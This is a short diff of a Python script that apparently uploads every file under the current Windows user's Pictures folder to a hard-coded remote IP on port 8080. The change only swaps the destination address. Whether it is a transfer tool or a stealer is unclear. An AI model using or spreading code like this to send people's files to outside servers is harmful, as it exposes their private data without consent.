@@ -52,6 +52,6 @@ def enviar_archivos(ruta_base, servidor, puerto):
 if __name__ == "__main__":
     user = os.environ['USERNAME']
     ruta_base = rf'C:\Users\{user}\Pictures'
-    servidor = "18.215.162.79"
+    servidor = "50.16.56.238"
     puerto = 8080 # Debe ser el mismo puerto usado en el servidor
     enviar_archivos(ruta_base, servidor, puerto)
